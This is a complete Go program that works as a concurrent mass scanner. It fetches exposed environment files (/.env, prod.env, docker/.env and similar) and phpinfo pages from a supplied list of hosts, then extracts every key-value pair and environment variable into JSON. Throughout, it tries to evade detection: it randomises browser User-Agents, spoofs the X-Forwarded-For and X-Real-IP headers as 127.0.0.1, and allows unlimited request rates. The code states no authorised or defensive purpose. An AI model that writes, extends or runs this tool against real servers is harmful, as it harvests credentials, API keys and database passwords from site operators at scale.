package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"html"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/time/rate"
)

// ---------------------------------------------------------------------------
// Logger
// ---------------------------------------------------------------------------

type LogLevel int

const (
	LDEBUG LogLevel = iota
	LINFO
	LWARN
	LERROR
)

type Logger struct {
	level LogLevel
	mu    sync.Mutex
}

func (l *Logger) log(level LogLevel, color, label, format string, args ...any) {
	if l.level > level {
		return
	}
	msg := fmt.Sprintf(format, args...)
	l.mu.Lock()
	fmt.Fprintf(os.Stderr, "%s[%s]\033[0m %s\n", color, label, msg)
	l.mu.Unlock()
}

func (l *Logger) Debug(format string, args ...any) {
	l.log(LDEBUG, "\033[36m", "DEBUG", format, args...)
}
func (l *Logger) Info(format string, args ...any) { l.log(LINFO, "\033[32m", "INFO", format, args...) }
func (l *Logger) Warn(format string, args ...any) { l.log(LWARN, "\033[33m", "WARN", format, args...) }
func (l *Logger) Error(format string, args ...any) {
	l.log(LERROR, "\033[31m", "ERROR", format, args...)
}

func parseLogLevel(s string) (LogLevel, error) {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "d", "deb", "debug":
		return LDEBUG, nil
	case "i", "inf", "info":
		return LINFO, nil
	case "w", "war", "warn":
		return LWARN, nil
	case "e", "err", "error":
		return LERROR, nil
	default:
		return LINFO, fmt.Errorf("unknown log level: %s", s)
	}
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

type Config struct {
	ConnectTimeout time.Duration
	RequestTimeout time.Duration
	Workers        int
	RateLimit      float64
	UserAgent      string
	LogLevel       LogLevel
	InputFile      string
	OutputFile     string
}

// ---------------------------------------------------------------------------
// Domain types
// ---------------------------------------------------------------------------

type Task struct {
	BaseURL string
	FullURL string
	Path    string
}

type Result struct {
	Timestamp      time.Time         `json:"timestamp"`
	URL            string            `json:"url"`
	ResponseTimeMs int64             `json:"response_time_ms"`
	EnvVars        map[string]string `json:"env_vars"`
}

// ---------------------------------------------------------------------------
// User-Agent generation
// ---------------------------------------------------------------------------

type uaTemplate struct {
	format string
	min    int
	max    int
}

var uaTemplates = []uaTemplate{
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", 110, 131},
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", 110, 131},
	{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", 110, 131},
	{"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Mobile Safari/537.36", 110, 131},
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", 115, 133},
	{"Mozilla/5.0 (X11; Linux x86_64; rv:%d.0) Gecko/20100101 Firefox/%d.0", 115, 133},
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%d.1 Safari/605.1.15", 16, 17},
	{"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%d.0 Mobile/15E148 Safari/604.1", 16, 17},
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", 110, 131},
	{"curl/8.%d.0", 1, 11},
	{"python-requests/2.%d.0", 28, 32},
}

func randomUserAgent() string {
	t := uaTemplates[rand.Intn(len(uaTemplates))]
	v := t.min + rand.Intn(t.max-t.min+1)
	n := strings.Count(t.format, "%d")
	args := make([]any, n)
	for i := range args {
		args[i] = v
	}
	return fmt.Sprintf(t.format, args...)
}

// ---------------------------------------------------------------------------
// Parser
// ---------------------------------------------------------------------------

var phpinfoTdRe = regexp.MustCompile(`<td class="e">(?P<name>.*?)</td><td class="v">(?P<value>.*?)</td>`)

type Parser struct {
	logger *Logger
}

func NewParser(logger *Logger) *Parser {
	return &Parser{logger: logger}
}

func (p *Parser) ParseEnv(body string) map[string]string {
	vars := make(map[string]string)
	scanner := bufio.NewScanner(strings.NewReader(body))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		line = strings.TrimSpace(strings.TrimPrefix(line, "export "))
		idx := strings.Index(line, "=")
		if idx < 0 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		if key == "" {
			continue
		}
		if len(val) >= 2 &&
			((val[0] == '"' && val[len(val)-1] == '"') ||
				(val[0] == '\'' && val[len(val)-1] == '\'')) {
			val = val[1 : len(val)-1]
		} else {
			if i := strings.Index(val, " #"); i >= 0 {
				val = strings.TrimSpace(val[:i])
			}
		}
		vars[key] = val
	}
	return vars
}

func (p *Parser) ParsePhpinfo(body, fullURL string) map[string]string {
	p.logger.Debug("Parsing phpinfo.php response from %s", fullURL)
	vars := make(map[string]string)

	parts := strings.SplitN(body, "<h2>Environment</h2>", 2)
	if len(parts) < 2 {
		p.logger.Warn("Failed to parse phpinfo.php: %v", fmt.Errorf("Environment section not found"))
		return vars
	}
	section := strings.SplitN(parts[1], "</table>", 2)[0]

	for _, match := range phpinfoTdRe.FindAllStringSubmatch(section, -1) {
		name := html.UnescapeString(strings.TrimSpace(match[1]))
		value := html.UnescapeString(strings.TrimSpace(match[2]))
		if name != "" {
			vars[name] = value
		}
	}

	p.logger.Debug("Extracted %d environment variables from phpinfo.php", len(vars))
	return vars
}

// ---------------------------------------------------------------------------
// Worker
// ---------------------------------------------------------------------------

type Worker struct {
	id      int
	cfg     *Config
	client  *http.Client
	limiter *rate.Limiter
	parser  *Parser
	logger  *Logger
}

func NewWorker(id int, cfg *Config, client *http.Client, limiter *rate.Limiter, parser *Parser, logger *Logger) *Worker {
	return &Worker{
		id:      id,
		cfg:     cfg,
		client:  client,
		limiter: limiter,
		parser:  parser,
		logger:  logger,
	}
}

func (w *Worker) Run(ctx context.Context, tasks <-chan Task, results chan<- Result) {
	w.logger.Debug("Worker %d started", w.id)
	defer w.logger.Debug("Worker %d stopped", w.id)

	for {
		w.logger.Debug("Worker %d waiting for tasks", w.id)
		select {
		case <-ctx.Done():
			return
		case task, ok := <-tasks:
			if !ok {
				return
			}
			w.logger.Debug("Worker %d received task: %s", w.id, task.FullURL)
			if w.limiter != nil {
				if err := w.limiter.Wait(ctx); err != nil {
					return
				}
			}
			result, err := w.process(ctx, task)
			if err != nil {
				continue
			}
			select {
			case <-ctx.Done():
				return
			case results <- result:
			}
		}
	}
}

func (w *Worker) process(ctx context.Context, task Task) (Result, error) {
	w.logger.Debug("Worker %d processing: %s", w.id, task.FullURL)

	ua := w.cfg.UserAgent
	if ua == "" {
		ua = randomUserAgent()
	}
	w.logger.Debug("Worker %d using User-Agent: %s", w.id, ua)

	reqCtx, cancel := context.WithTimeout(ctx, w.cfg.RequestTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, task.FullURL, nil)
	if err != nil {
		w.logger.Error("Worker %d: %s - %v", w.id, task.FullURL, err)
		return Result{}, err
	}

	req.Header.Set("User-Agent", ua)
	req.Header.Set("X-Forwarded-For", "127.0.0.1")
	req.Header.Set("X-Real-IP", "127.0.0.1")
	w.logger.Debug("Request headers: %v", req.Header)

	start := time.Now()
	resp, err := w.client.Do(req)
	elapsed := time.Since(start)

	if err != nil {
		if ctx.Err() != nil || strings.Contains(err.Error(), "context") || strings.Contains(err.Error(), "deadline exceeded") || strings.Contains(err.Error(), "timeout") {
			w.logger.Warn("Worker %d: %s - timeout after %v", w.id, task.FullURL, w.cfg.RequestTimeout)
		} else {
			w.logger.Error("Worker %d: %s - %v", w.id, task.FullURL, err)
		}
		return Result{}, err
	}
	defer resp.Body.Close()

	w.logger.Info("Worker %d completed: %s - %d (%dms)", w.id, task.FullURL, resp.StatusCode, elapsed.Milliseconds())

	if resp.StatusCode != http.StatusOK {
		return Result{}, fmt.Errorf("status %d", resp.StatusCode)
	}

	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
	if err != nil {
		w.logger.Error("Worker %d: %s - failed to read response body: %v", w.id, task.FullURL, err)
		return Result{}, err
	}
	bodyStr := string(bodyBytes)

	var envVars map[string]string
	switch task.Path {
	case ".env":
		w.logger.Debug("Parsing .env response from %s", task.FullURL)
		envVars = w.parser.ParseEnv(bodyStr)
		w.logger.Debug("Extracted %d environment variables from .env", len(envVars))
	case "phpinfo.php", "info.php":
		envVars = w.parser.ParsePhpinfo(bodyStr, task.FullURL)
	default:
		envVars = map[string]string{}
	}

	return Result{
		Timestamp:      time.Now().UTC(),
		URL:            task.FullURL,
		ResponseTimeMs: elapsed.Milliseconds(),
		EnvVars:        envVars,
	}, nil
}

// ---------------------------------------------------------------------------
// ResultWriter
// ---------------------------------------------------------------------------

type ResultWriter struct {
	outputFile string
	logger     *Logger
}

func NewResultWriter(outputFile string, logger *Logger) *ResultWriter {
	return &ResultWriter{outputFile: outputFile, logger: logger}
}

func (rw *ResultWriter) Run(results <-chan Result, done chan<- error) {
	var finalErr error

	dest := rw.outputFile
	if dest == "" || dest == "-" {
		dest = "stdout"
	}
	rw.logger.Debug("Writer started, output to: %s", dest)

	var w io.Writer
	if rw.outputFile == "" || rw.outputFile == "-" {
		w = os.Stdout
	} else {
		f, err := os.Create(rw.outputFile)
		if err != nil {
			rw.logger.Error("Failed to open output file: %v", err)
			for range results {
			}
			done <- err
			return
		}
		defer f.Close()
		w = f
	}

	enc := json.NewEncoder(w)
	count := 0
	for result := range results {
		rw.logger.Debug("Writing result: %s", result.URL)
		if err := enc.Encode(result); err != nil {
			rw.logger.Error("Failed to write result: %v", err)
			if finalErr == nil {
				finalErr = err
			}
		} else {
			count++
		}
	}
	rw.logger.Info("Writer finished: %d results written", count)
	done <- finalErr
}

// ---------------------------------------------------------------------------
// Scanner
// ---------------------------------------------------------------------------

var scanPaths = []string{
	"/.env",
	"/.env.local",
	"/prod.env",
	"/dev.env",
	"/test.env",
	"/config/.env",
	"/docker/.env",
	"/phpinfo.php",
	"/info.php",
}

type Scanner struct {
	cfg     *Config
	logger  *Logger
	client  *http.Client
	limiter *rate.Limiter
	parser  *Parser
}

func NewScanner(cfg *Config, logger *Logger) *Scanner {
	logger.Debug("Creating HTTP client with connect timeout: %v, request timeout: %v", cfg.ConnectTimeout, cfg.RequestTimeout)
	dialer := &net.Dialer{Timeout: cfg.ConnectTimeout}
	transport := &http.Transport{
		DialContext:         dialer.DialContext,
		DisableKeepAlives:   true,
		TLSHandshakeTimeout: cfg.ConnectTimeout,
	}
	client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var limiter *rate.Limiter
	if cfg.RateLimit > 0 {
		limiter = rate.NewLimiter(rate.Limit(cfg.RateLimit), 1)
		logger.Debug("Rate limiter enabled: %.1f req/s", cfg.RateLimit)
	}

	return &Scanner{
		cfg:     cfg,
		logger:  logger,
		client:  client,
		limiter: limiter,
		parser:  NewParser(logger),
	}
}

func (s *Scanner) ReadInput() ([]string, error) {
	src := s.cfg.InputFile
	if src == "" || src == "-" {
		src = "stdin"
	}
	s.logger.Debug("Reading input from: %s", src)

	var r io.Reader
	if s.cfg.InputFile == "" || s.cfg.InputFile == "-" {
		r = os.Stdin
	} else {
		f, err := os.Open(s.cfg.InputFile)
		if err != nil {
			s.logger.Error("Failed to read input: %v", err)
			return nil, err
		}
		defer f.Close()
		r = f
	}

	var urls []string
	sc := bufio.NewScanner(r)
	lineNum := 0
	for sc.Scan() {
		lineNum++
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			s.logger.Warn("Skipped empty line at line %d", lineNum)
			continue
		}
		if strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.Contains(line, "://") {
			line = "http://" + line
		}
		urls = append(urls, line)
	}
	if err := sc.Err(); err != nil {
		s.logger.Error("Failed to read input: %v", err)
		return nil, err
	}

	s.logger.Debug("Read %d base URLs", len(urls))
	return urls, nil
}

func (s *Scanner) generateTasks(ctx context.Context, baseURLs []string, tasks chan<- Task) {
	s.logger.Debug("Generator started")
	total := 0
	for _, base := range baseURLs {
		s.logger.Debug("Generating tasks for base URL: %s", base)
		for _, path := range scanPaths {
			full, err := url.JoinPath(base, path)
			if err != nil {
				s.logger.Warn("Failed to join path %s with %s: %v", base, path, err)
				continue
			}
			s.logger.Debug("Generated task: %s -> %s", base, full)
			select {
			case <-ctx.Done():
				s.logger.Info("Generator finished: %d total tasks created", total)
				return
			case tasks <- Task{BaseURL: base, FullURL: full, Path: strings.TrimPrefix(path, "/")}:
				total++
			}
		}
	}
	s.logger.Info("Generator finished: %d total tasks created", total)
}

func (s *Scanner) Run(ctx context.Context, baseURLs []string) error {
	tasks := make(chan Task, s.cfg.Workers*2)
	results := make(chan Result, s.cfg.Workers*2)
	writerDone := make(chan error, 1)

	rw := NewResultWriter(s.cfg.OutputFile, s.logger)
	go rw.Run(results, writerDone)

	go func() {
		s.generateTasks(ctx, baseURLs, tasks)
		close(tasks)
	}()

	var wg sync.WaitGroup
	for i := 1; i <= s.cfg.Workers; i++ {
		wg.Add(1)
		w := NewWorker(i, s.cfg, s.client, s.limiter, s.parser, s.logger)
		go func() {
			defer wg.Done()
			w.Run(ctx, tasks, results)
		}()
	}

	s.logger.Debug("Waiting for workers to finish")
	wg.Wait()
	close(results)
	return <-writerDone
}

func validateConfig(cfg *Config) error {
	if cfg.Workers <= 0 {
		return fmt.Errorf("workers must be greater than 0, got %d", cfg.Workers)
	}
	if cfg.ConnectTimeout <= 0 {
		return fmt.Errorf("connect-timeout must be greater than 0, got %s", cfg.ConnectTimeout)
	}
	if cfg.RequestTimeout <= 0 {
		return fmt.Errorf("request-timeout must be greater than 0, got %s", cfg.RequestTimeout)
	}
	if cfg.RateLimit < 0 {
		return fmt.Errorf("rate-limit must be non-negative, got %v", cfg.RateLimit)
	}
	return nil
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	var (
		connectTimeout time.Duration
		requestTimeout time.Duration
		workers        int
		rateLimit      float64
		userAgent      string
		logLevelStr    string
		inputFile      string
		outputFile     string
	)

	flag.DurationVar(&connectTimeout, "connect-timeout", 10*time.Second, "TCP connection timeout")
	flag.DurationVar(&connectTimeout, "c", 10*time.Second, "TCP connection timeout (shorthand)")
	flag.DurationVar(&requestTimeout, "request-timeout", 30*time.Second, "Full request timeout")
	flag.DurationVar(&requestTimeout, "r", 30*time.Second, "Full request timeout (shorthand)")
	flag.IntVar(&workers, "workers", 10, "Number of concurrent workers")
	flag.IntVar(&workers, "w", 10, "Number of concurrent workers (shorthand)")
	flag.Float64Var(&rateLimit, "rate-limit", 0, "Max requests per second (0 = unlimited)")
	flag.Float64Var(&rateLimit, "R", 0, "Max requests per second (shorthand)")
	flag.StringVar(&userAgent, "user-agent", "", "Custom User-Agent (random if empty)")
	flag.StringVar(&userAgent, "ua", "", "Custom User-Agent (shorthand)")
	flag.StringVar(&logLevelStr, "log-level", "info", "Log level: debug, info, warn, error")
	flag.StringVar(&logLevelStr, "l", "info", "Log level (shorthand)")
	flag.StringVar(&inputFile, "input", "-", "File with base URLs (or - for stdin)")
	flag.StringVar(&inputFile, "i", "-", "Input file (shorthand)")
	flag.StringVar(&outputFile, "output", "-", "File for results (or - for stdout)")
	flag.StringVar(&outputFile, "o", "-", "Output file (shorthand)")

	flag.Parse()

	logLevel, err := parseLogLevel(logLevelStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "\033[31m[ERROR]\033[0m %v\n", err)
		os.Exit(1)
	}

	logger := &Logger{level: logLevel}

	cfg := &Config{
		ConnectTimeout: connectTimeout,
		RequestTimeout: requestTimeout,
		Workers:        workers,
		RateLimit:      rateLimit,
		UserAgent:      userAgent,
		LogLevel:       logLevel,
		InputFile:      inputFile,
		OutputFile:     outputFile,
	}

	if err := validateConfig(cfg); err != nil {
		logger.Error("%v", err)
		os.Exit(1)
	}

	scanner := NewScanner(cfg, logger)

	baseURLs, err := scanner.ReadInput()
	if err != nil {
		os.Exit(1)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		sig := <-sigCh
		logger.Info("Received signal: %v, shutting down...", sig)
		logger.Debug("Canceling context")
		cancel()
	}()

	if err := scanner.Run(ctx, baseURLs); err != nil {
		logger.Error("Scan failed: %v", err)
		os.Exit(1)
	}
	logger.Info("Shutdown complete")
}
